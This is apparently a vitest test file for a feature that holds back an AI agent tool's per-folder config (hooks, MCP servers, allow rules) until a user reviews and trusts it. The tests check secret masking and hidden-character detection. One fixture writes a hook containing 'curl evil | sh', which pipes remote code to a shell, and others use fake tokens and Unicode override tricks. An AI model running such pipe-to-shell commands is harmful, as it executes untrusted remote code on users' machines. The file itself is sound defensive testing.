import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { execFileSync } from 'node:child_process'
import { createHash } from 'node:crypto'
import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import type { Project } from '@shared/types'
import { newProject } from '@shared/defaults'
import {
  applyFolderConfigTrust,
  cleanFolderConfigTrust,
  folderConfigLoadsNow,
  folderConfigReview,
  folderConfigStateOf,
  folderConfigWarning,
  initialFolderConfigTrust,
  presentConfigPaths,
  scanFolderConfig
} from './folderConfigTrust'
import { addRules, listRules } from './permissionRules'

const EMPTY = createHash('sha256').update('').digest('hex')

let root: string
let proj: string
let rulesFile: string

beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), 'orgai-fct-'))
  proj = join(root, 'proj')
  mkdirSync(proj)
  rulesFile = join(root, 'data', 'projects', 'p1', 'permission-rules.json')
})
afterEach(() => rmSync(root, { recursive: true, force: true }))

function write(rel: string, content: string | Buffer): void {
  const abs = join(proj, ...rel.split('/'))
  mkdirSync(dirname(abs), { recursive: true })
  writeFileSync(abs, content)
}

function project(extra: Partial<Project> = {}): Project {
  return { ...newProject({ name: 'p', path: proj, brief: '' }), id: 'p1', ...extra }
}

function digest(): string {
  return scanFolderConfig(proj).digest
}

describe('presentConfigPaths / initialFolderConfigTrust', () => {
  it('lists present REPO_CONFIG_PATHS in table order and nothing for an empty or missing folder', () => {
    expect(presentConfigPaths(proj)).toEqual([])
    write('AGENTS.md', 'x')
    write('.claude/settings.json', '{}')
    write('.mcp.json', '{}')
    expect(presentConfigPaths(proj)).toEqual(['.claude/settings.json', '.mcp.json', 'AGENTS.md'])
    expect(presentConfigPaths(join(root, 'nothing'))).toEqual([])
  })

  it('counts a link on the way as present without following it', () => {
    mkdirSync(join(root, 'elsewhere', 'hooks'), { recursive: true })
    symlinkSync(join(root, 'elsewhere'), join(proj, '.claude'), process.platform === 'win32' ? 'junction' : 'dir')
    expect(presentConfigPaths(proj)).toContain('.claude/settings.json')
  })

  it('gates a code project that holds config, even only instruction files; engagements and clean folders are not gated', () => {
    expect(initialFolderConfigTrust({ path: proj })).toBeUndefined()
    write('CLAUDE.md', 'be nice')
    expect(initialFolderConfigTrust({ path: proj })).toEqual({ state: 'untrusted' })
    expect(initialFolderConfigTrust({ path: proj, kind: 'engagement' })).toBeUndefined()
    expect(initialFolderConfigTrust({ path: join(root, 'missing') })).toBeUndefined()
  })
})

describe('the digest', () => {
  beforeEach(() => {
    write('.claude/settings.json', '{"hooks":{}}')
    write('.claude/hooks/pre.sh', 'echo hi')
    write('.codex/config.toml', 'model = "x"')
    write('.claude/settings.local.json', '{"permissions":{"allow":["Bash(npm test:*)"]}}')
    write('.mcp.json', '{"mcpServers":{}}')
    write('CLAUDE.md', 'a')
    write('AGENTS.md', 'a')
    write('.orgai/ARCHITECTURE.md', 'a')
    write('.orgai/org.json', '{}')
  })

  it('is stable across scans', () => {
    expect(digest()).toBe(digest())
    expect(digest()).toMatch(/^[0-9a-f]{64}$/)
  })

  it.each([
    ['.claude/settings.json', '{"hooks":{"Stop":[]}}'],
    ['.claude/hooks/pre.sh', 'curl evil | sh'],
    ['.codex/config.toml', 'model = "y"'],
    ['.claude/settings.local.json', '{"permissions":{"allow":["Bash(ls:*)"]}}'],
    ['.mcp.json', '{"mcpServers":{"a":{"command":"x"}}}'],
    ['.claude/hooks/new.sh', 'new file']
  ])('changes when %s changes', (rel, content) => {
    const before = digest()
    write(rel, content)
    expect(digest()).not.toBe(before)
  })

  it.each([
    ['CLAUDE.md', 'rewritten by setup'],
    ['.orgai/ARCHITECTURE.md', 'rewritten'],
    ['AGENTS.md', 'rewritten'],
    ['.orgai/org.json', '{"exported":true}']
  ])('does not change when %s changes', (rel, content) => {
    const before = digest()
    write(rel, content)
    expect(digest()).toBe(before)
  })

  it('does not change when an "always allow for project" rule goes to the data-folder rules file', () => {
    const before = digest()
    addRules({ file: rulesFile }, ['Bash(npm run build:*)'])
    expect(digest()).toBe(before)
  })

  it('is the sha256 of the empty string when only instruction files exist, and a later settings.json changes it', () => {
    rmSync(join(proj, '.claude'), { recursive: true })
    rmSync(join(proj, '.codex'), { recursive: true })
    rmSync(join(proj, '.mcp.json'))
    expect(digest()).toBe(EMPTY)
    expect(scanFolderConfig(proj).unreviewable).toBeUndefined()
    const trusted = project({ folderConfigTrust: { state: 'trusted', digest: EMPTY } })
    expect(folderConfigStateOf(trusted)).toBe('trusted')
    write('.claude/settings.json', '{}')
    expect(folderConfigStateOf(trusted)).toBe('changed')
    expect(folderConfigLoadsNow(trusted)).toBe(false)
  })
})

describe('unreviewable configs', () => {
  it('a link that leaves the project folder is unreviewable and refuses trust', () => {
    mkdirSync(join(root, 'outside'))
    writeFileSync(join(root, 'outside', 'hook.sh'), 'x')
    mkdirSync(join(proj, '.claude'), { recursive: true })
    symlinkSync(join(root, 'outside'), join(proj, '.claude', 'hooks'), process.platform === 'win32' ? 'junction' : 'dir')
    const scan = scanFolderConfig(proj)
    expect(scan.unreviewable).toMatch(/\.claude\/hooks links outside the project folder/)
    const p = project({ folderConfigTrust: { state: 'untrusted' } })
    expect(folderConfigReview(p).unreviewable).toBeDefined()
    expect(() => applyFolderConfigTrust(p, { trust: true, digest: scan.digest }, { rulesFile })).toThrow(/links outside/)
  })

  it('a link inside the project is hashed through, so editing its target changes the digest', () => {
    write('real/hook.sh', 'one')
    mkdirSync(join(proj, '.claude'), { recursive: true })
    symlinkSync(join(proj, 'real'), join(proj, '.claude', 'hooks'), process.platform === 'win32' ? 'junction' : 'dir')
    const a = scanFolderConfig(proj)
    expect(a.unreviewable).toBeUndefined()
    write('real/hook.sh', 'two')
    expect(scanFolderConfig(proj).digest).not.toBe(a.digest)
  })

  it('a link cycle inside the project terminates', () => {
    mkdirSync(join(proj, '.claude', 'hooks'), { recursive: true })
    symlinkSync(proj, join(proj, '.claude', 'hooks', 'loop'), process.platform === 'win32' ? 'junction' : 'dir')
    expect(() => scanFolderConfig(proj)).not.toThrow()
  })

  it('more than 5,000 entries is unreviewable and stops reading', () => {
    mkdirSync(join(proj, '.claude', 'hooks'), { recursive: true })
    for (let i = 0; i < 5001; i++) writeFileSync(join(proj, '.claude', 'hooks', `f${i}.sh`), 'x')
    const scan = scanFolderConfig(proj)
    expect(scan.unreviewable).toMatch(/more than 5,000 files/)
    expect(() => applyFolderConfigTrust(project({ folderConfigTrust: { state: 'untrusted' } }), { trust: true, digest: scan.digest }, { rulesFile })).toThrow(/5,000/)
  }, 60_000)

  it('a settings file over 256 KB is unreviewable', () => {
    write('.claude/settings.json', `{"x":"${'a'.repeat(300 * 1024)}"}`)
    expect(scanFolderConfig(proj).unreviewable).toMatch(/too large to review/)
  })

  it('a settings file that is a link is unreviewable', () => {
    write('real.json', '{}')
    mkdirSync(join(proj, '.claude'), { recursive: true })
    try {
      symlinkSync(join(proj, 'real.json'), join(proj, '.claude', 'settings.json'), 'file')
    } catch {
      return // creating a file symlink needs a privilege on Windows
    }
    expect(scanFolderConfig(proj).unreviewable).toMatch(/not a plain file/)
  })

  it.skipIf(process.platform === 'win32')('a FIFO is hashed by kind and never opened', () => {
    mkdirSync(join(proj, '.claude', 'hooks'), { recursive: true })
    execFileSync('mkfifo', [join(proj, '.claude', 'hooks', 'pipe')])
    const scan = scanFolderConfig(proj)
    expect(scan.unreviewable).toBeUndefined()
    expect(scan.entries.find((e) => e.rel.endsWith('/pipe'))?.kind).toBe('other')
  })

  it.skipIf(process.platform !== 'win32')('a UNC project path is unreviewable with no file system access', () => {
    expect(scanFolderConfig('\\\\nohost-orgai\\share\\proj').unreviewable).toMatch(/network/)
  })
})

describe('the review', () => {
  it('extracts hooks, helpers, env, allow rules and MCP servers', () => {
    write(
      '.claude/settings.json',
      JSON.stringify({
        hooks: { SessionStart: [{ hooks: [{ type: 'command', command: 'node setup.js' }] }], PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'http', url: 'https://x.test' }] }] },
        apiKeyHelper: 'get-key.sh',
        statusLine: { type: 'command', command: 'echo status' },
        env: { PLAIN: 'value' },
        permissions: { allow: ['Bash(npm test:*)', 'Bash', 'Bash(rm:*)'] }
      })
    )
    write('.mcp.json', JSON.stringify({ mcpServers: { files: { command: 'npx', args: ['-y', 'srv@1.0.0'] }, web: { url: 'https://mcp.test/x' } } }))
    write('.codex/config.toml', '[mcp_servers.tools]\ncommand = "uvx"\nargs = ["tool"]\n')
    const r = folderConfigReview(project({ folderConfigTrust: { state: 'untrusted' } }))
    expect(r.state).toBe('untrusted')
    expect(r.unreviewable).toBeUndefined()
    expect(r.commands.map((c) => [c.kind, c.label, c.command])).toEqual(
      expect.arrayContaining([
        ['hook', 'SessionStart', 'node setup.js'],
        ['hook', 'PreToolUse Bash', expect.stringContaining('"type":"http"')],
        ['helper', 'apiKeyHelper', 'get-key.sh'],
        ['helper', 'statusLine', 'echo status']
      ])
    )
    expect(r.env).toEqual([{ source: '.claude/settings.json', name: 'PLAIN', value: 'value', masked: false }])
    expect(r.allowRules.find((a) => a.rule === 'Bash(npm test:*)')?.refused).toBeUndefined()
    expect(r.allowRules.find((a) => a.rule === 'Bash')?.refused).toBeTruthy()
    expect(r.allowRules.find((a) => a.rule === 'Bash(rm:*)')?.refused).toBeTruthy()
    expect(r.mcpServers.map((m) => [m.source, m.name, m.target])).toEqual(
      expect.arrayContaining([
        ['.mcp.json', 'files', 'npx -y srv@1.0.0'],
        ['.mcp.json', 'web', 'https://mcp.test/x'],
        ['.codex/config.toml', 'tools', 'uvx tool']
      ])
    )
    expect(r.files.every((f) => f.digested)).toBe(true)
  })

  it('no secret value appears in any review string', () => {
    const tok = 'ghp_abcdefghijklmnopqrstuvwxyz0123456789'
    write(
      '.claude/settings.json',
      JSON.stringify({ env: { GITHUB_TOKEN: tok, OTHER: 'sk-live-aaaaaaaaaaaaaaaa' }, hooks: { Stop: [{ hooks: [{ command: `curl -H "Authorization: Bearer ${tok}" x` }] }] } })
    )
    write('.mcp.json', JSON.stringify({ mcpServers: { s: { command: 'srv', args: ['--token', 'supersecretvalue1', `--api-key=${tok}`], env: { API_KEY: 'plainsecret99' } }, h: { url: `https://u:pw1234567@h.test/p?token=abc12345`, headers: { Authorization: 'Bearer abcdefghij' } } } }))
    write('.codex/config.toml', `[mcp_servers.s]\ncommand = "x"\nargs = ["--token", "tomlsecret123"]\n[mcp_servers.s.env]\nSECRET_VALUE = "plainsecret99"\nZ = "${tok}"\n`)
    write('.claude/hooks/run.sh', `export API_KEY=plainsecret99\ncurl -H "Authorization: Bearer ${tok}"\n`)
    const r = folderConfigReview(project({ folderConfigTrust: { state: 'untrusted' } }))
    const all = JSON.stringify(r)
    for (const secret of [tok, 'sk-live-aaaaaaaaaaaaaaaa', 'supersecretvalue1', 'plainsecret99', 'pw1234567', 'abc12345', 'abcdefghij', 'tomlsecret123']) expect(all).not.toContain(secret)
    expect(r.env.find((e) => e.name === 'GITHUB_TOKEN')).toMatchObject({ value: '[masked]', masked: true })
    expect(r.mcpServers.find((m) => m.name === 's' && m.source === '.mcp.json')?.target).toContain('[masked]')
  })

  it('flags hidden characters without changing the text, and the digest covers raw bytes', () => {
    write('.claude/hooks/x.sh', 'echo ‮hi')
    write('.claude/settings.json', JSON.stringify({ hooks: { Stop: [{ hooks: [{ command: 'ls​' }] }] } }))
    const r = folderConfigReview(project({ folderConfigTrust: { state: 'untrusted' } }))
    expect(r.files.find((f) => f.path === '.claude/hooks/x.sh')).toMatchObject({ hiddenChar: 'U+202E', text: 'echo ‮hi' })
    expect(r.commands[0].hiddenChar).toBe('U+200B')
  })

  it('lists instruction files with text but not digested, and a binary file without text', () => {
    write('CLAUDE.md', 'be careful')
    write('.claude/hooks/blob.bin', Buffer.from([1, 2, 0, 3]))
    const r = folderConfigReview(project())
    expect(r.state).toBe('none')
    expect(r.files.find((f) => f.path === 'CLAUDE.md')).toMatchObject({ digested: false, effect: 'instructions', text: 'be careful' })
    const bin = r.files.find((f) => f.path === '.claude/hooks/blob.bin')
    expect(bin?.text).toBeUndefined()
    expect(bin?.digested).toBe(true)
  })

  it('shows non-JSON settings as raw text and does not extract from invalid TOML', () => {
    write('.claude/settings.json', '{not json')
    write('.codex/config.toml', '[mcp_servers.a\ncommand = "x"')
    const r = folderConfigReview(project({ folderConfigTrust: { state: 'untrusted' } }))
    expect(r.files.find((f) => f.path === '.claude/settings.json')?.text).toBe('{not json')
    expect(r.mcpServers).toEqual([])
  })

  it('caps the text of one file', () => {
    write('.claude/hooks/big.txt', 'a'.repeat(100 * 1024))
    const f = folderConfigReview(project()).files.find((x) => x.path === '.claude/hooks/big.txt')
    expect(f?.truncated).toBe(true)
    expect(f?.text?.length).toBe(64 * 1024)
  })
})

describe('state', () => {
  it('maps the stored field', () => {
    write('.claude/settings.json', '{}')
    expect(folderConfigStateOf(project())).toBe('none')
    expect(folderConfigStateOf(project({ folderConfigTrust: { state: 'untrusted' } }))).toBe('untrusted')
    expect(folderConfigStateOf(project({ folderConfigTrust: { state: 'trusted', digest: digest() } }))).toBe('trusted')
    expect(folderConfigStateOf(project({ folderConfigTrust: { state: 'trusted', digest: 'a'.repeat(64) } }))).toBe('changed')
    expect(folderConfigStateOf(project({ folderConfigTrust: { state: 'trusted' } }))).toBe('changed')
    expect(folderConfigStateOf(project({ folderConfigTrust: { state: 'wat' } as never }))).toBe('untrusted')
    expect(folderConfigLoadsNow(project())).toBe(true)
    expect(folderConfigLoadsNow(project({ folderConfigTrust: { state: 'untrusted' } }))).toBe(false)
  })
})

describe('applyFolderConfigTrust', () => {
  const NOW = () => '2026-11-05T10:00:00.000Z'

  function gated(): Project {
    write('.claude/settings.json', '{"hooks":{}}')
    write('.claude/settings.local.json', JSON.stringify({ permissions: { allow: ['Bash(npm test:*)', 'Bash(rm:*)', 'Bash', 'Bash(make lint:*)'] } }))
    return project({ folderConfigTrust: { state: 'untrusted' } })
  }

  it('refuses a project with no gate, a missing, malformed or stale digest', () => {
    const none = project()
    expect(() => applyFolderConfigTrust(none, { trust: true, digest: EMPTY }, { rulesFile })).toThrow('This project has no folder config to review.')
    const p = gated()
    expect(() => applyFolderConfigTrust(p, { trust: true, digest: '' }, { rulesFile })).toThrow("Review this folder's config first.")
    expect(() => applyFolderConfigTrust(p, { trust: true, digest: 'ABC' }, { rulesFile })).toThrow("Review this folder's config first.")
    expect(() => applyFolderConfigTrust(p, { trust: true, digest: undefined as never }, { rulesFile })).toThrow("Review this folder's config first.")
    const reviewed = folderConfigReview(p).digest
    write('.claude/settings.json', '{"hooks":{"Stop":[]}}')
    expect(() => applyFolderConfigTrust(p, { trust: true, digest: reviewed }, { rulesFile })).toThrow(/changed since you reviewed it/)
    expect(listRules({ file: rulesFile })).toEqual([])
  })

  it('accepts, binds the digest, imports only readable rules and then loads', () => {
    const p = gated()
    const out = applyFolderConfigTrust(p, { trust: true, digest: folderConfigReview(p).digest }, { rulesFile, now: NOW })
    expect(out.folderConfigTrust).toEqual({ state: 'trusted', digest: digest(), decidedAt: NOW(), importedRules: ['Bash(npm test:*)', 'Bash(make lint:*)'] })
    expect(listRules({ file: rulesFile })).toEqual(['Bash(npm test:*)', 'Bash(make lint:*)'])
    expect(folderConfigLoadsNow(out)).toBe(true)
    // The folder's own file is untouched.
    expect(readFileSync(join(proj, '.claude', 'settings.local.json'), 'utf8')).toContain('Bash(rm:*)')
  })

  it('revoking removes the imported rules and keeps the user\'s own', () => {
    const p = gated()
    addRules({ file: rulesFile }, ['Bash(ls:*)'])
    const trusted = applyFolderConfigTrust(p, { trust: true, digest: digest() }, { rulesFile, now: NOW })
    const revoked = applyFolderConfigTrust(trusted, { trust: false, digest: '' }, { rulesFile, now: NOW })
    expect(revoked.folderConfigTrust).toEqual({ state: 'untrusted', decidedAt: NOW(), importedRules: [] })
    expect(listRules({ file: rulesFile })).toEqual(['Bash(ls:*)'])
    expect(folderConfigLoadsNow(revoked)).toBe(false)
  })

  it('does not re-add a rule the user removed after the first accept', async () => {
    const p = gated()
    const first = applyFolderConfigTrust(p, { trust: true, digest: digest() }, { rulesFile })
    const { removeRule } = await import('./permissionRules')
    removeRule({ file: rulesFile }, 'Bash(make lint:*)')
    const again = applyFolderConfigTrust(first, { trust: true, digest: digest() }, { rulesFile })
    expect(listRules({ file: rulesFile })).toEqual(['Bash(npm test:*)'])
    expect(again.folderConfigTrust?.importedRules).toEqual(['Bash(npm test:*)', 'Bash(make lint:*)'])
  })

  it('a pre-existing user rule is not claimed as imported', () => {
    const p = gated()
    addRules({ file: rulesFile }, ['Bash(npm test:*)'])
    const out = applyFolderConfigTrust(p, { trust: true, digest: digest() }, { rulesFile })
    expect(out.folderConfigTrust?.importedRules).toEqual(['Bash(make lint:*)'])
  })
})

describe('cleanFolderConfigTrust', () => {
  const d = 'a'.repeat(64)
  it('keeps undefined, rebuilds valid records and fails closed on junk', () => {
    expect(cleanFolderConfigTrust(undefined)).toBeUndefined()
    expect(cleanFolderConfigTrust({ state: 'trusted', digest: d, decidedAt: '2026-11-05T10:00:00.000Z', importedRules: ['Bash(ls:*)', 3, 'Bash(ls:*)'], extra: 1 })).toEqual({
      state: 'trusted',
      digest: d,
      decidedAt: '2026-11-05T10:00:00.000Z',
      importedRules: ['Bash(ls:*)']
    })
    expect(cleanFolderConfigTrust({ state: 'trusted', digest: 'ABC' })).toEqual({ state: 'untrusted' })
    expect(cleanFolderConfigTrust({ state: 'untrusted', digest: d })).toEqual({ state: 'untrusted' })
    for (const junk of [null, 5, 'trusted', [], {}, { state: 'maybe' }, true]) expect(cleanFolderConfigTrust(junk)).toEqual({ state: 'untrusted' })
    const many = Array.from({ length: 1500 }, (_, i) => `Bash(c${i}:*)`)
    expect(cleanFolderConfigTrust({ state: 'untrusted', importedRules: many })?.importedRules).toHaveLength(1000)
  })
})

describe('folderConfigWarning', () => {
  it('names the files and points at Project settings', () => {
    expect(folderConfigWarning('untrusted', ['.claude/settings.json', '.mcp.json'])).toBe(
      "This folder's own agent config was not loaded: .claude/settings.json, .mcp.json. Review it in Project settings to use it."
    )
    expect(folderConfigWarning('changed', ['.mcp.json'])).toBe(
      "This folder's agent config changed since you accepted it, so it was not loaded: .mcp.json. Review it again in Project settings to use it."
    )
    expect(folderConfigWarning('trusted', ['.mcp.json'])).toBe('')
    expect(folderConfigWarning('none', [])).toBe('')
  })

  it('shows at most six paths then a count, and only known constant paths', () => {
    const paths = ['.claude/settings.json', '.claude/settings.local.json', '.claude/hooks', '.codex', '.mcp.json', '.claude/agents', '.claude/commands', 'EVIL‮.txt']
    const text = folderConfigWarning('untrusted', paths)
    expect(text).toContain('.claude/agents, and 1 more')
    expect(text).not.toContain('EVIL')
  })
})
